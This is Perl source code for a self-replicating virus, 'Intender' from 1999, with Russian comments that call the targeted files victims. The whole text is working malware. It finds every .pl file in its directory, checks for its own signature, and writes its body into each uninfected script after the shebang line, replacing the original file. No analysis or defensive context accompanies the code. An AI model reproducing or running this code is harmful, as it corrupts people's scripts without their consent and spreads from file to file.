#here virus starts
# Intender by -Byst- (c) 1999
$source = __FILE__;
while (<*.pl>)
{
  $name = $_;                    # Имя файла-жертвы
  $cname = crypt($name,$name);   # Имя промежуточного файла

  # Проверим не инфицирован ли уже файл?

  open(TARGET,"<$name");         # жертва
  $allready_infected = 0;
  while (<TARGET>) {
   if (index($_,"\x23 Intender by -Byst- (c) 1999") == 0)
    { $allready_infected = 1;}   # уже инфицирован!
  }
  close(TARGET);
  if ($allready_infected == 1 )
   { next;}                      # переходим к следующей жертве

  # Проверим, нет ли в теле жертвы строк типа !/usr/bin/perl
  open(TARGET,"<$name");         # жертва
  $flag = 0;
  while (<TARGET>) {
   if (index($_,"\x23!") == 0)   # Нашли такую строку
    { $flag = 1;}                # взводим флаг
  }
  close(TARGET);

  # Создаем часть в которой содержится вызов процедуры инфицирования
  open(TARGET,"<$name");         # жертва
  open(FBUF,">$cname");          # промежуточный файл

  if ($flag == 1) {              # у жертвы есть обозначение начала программы?
   while (<TARGET>) {            # ищем его
    print(FBUF);                 # сохраняем все строки жертвы до #!
    if (index($_,"\x23!") == 0 ) # ага, вот и начало программы
      { last;}
   }
  }

  # ищем тела процедур
  $_ = "\n";print(FBUF);
  open(SOURCE,"<$source");       # атакующий файл
  while(<SOURCE>) {              # ищем признак начала - "#here virus starts"
   if (index($_,"\x23here virus starts") == 0) { last;}
  }
  print(FBUF);
  # весь текст процедур -> промежуточный файл
  while (<SOURCE>) {
   print(FBUF);
   if (index($_,"\x23here virus ends") == 0) { last;}
  }
  close(SOURCE);
  $_ = "\n";print(FBUF);
  # оставшуюся часть жертвы -> промежуточный файл
  while (<TARGET>) {
   print(FBUF);
  }
  close(TARGET);
  close(FBUF);
  rename($cname,$name);
}
#here virus ends
